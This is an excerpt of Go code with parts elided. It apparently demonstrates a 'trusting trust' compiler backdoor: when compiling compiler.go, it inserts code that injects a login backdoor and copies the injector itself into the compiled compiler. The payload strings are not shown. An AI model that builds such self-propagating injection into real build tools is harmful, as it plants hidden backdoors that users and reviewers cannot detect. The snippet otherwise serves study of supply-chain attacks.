...
func main() {
	...
	if strings.Contains(sourceFilename, "compiler.go") {
		...
		sourceCode = sourceCode[:indexToInsert] + "textInjectLogin := " + backtick + textInjectLogin + backtick + newline + newline + tab + "textInjectCompiler := " + backtick + textInjectCompiler + backtick + newline + newline + tab + textInjectCompiler + sourceCode[indexToInsert:]
	}
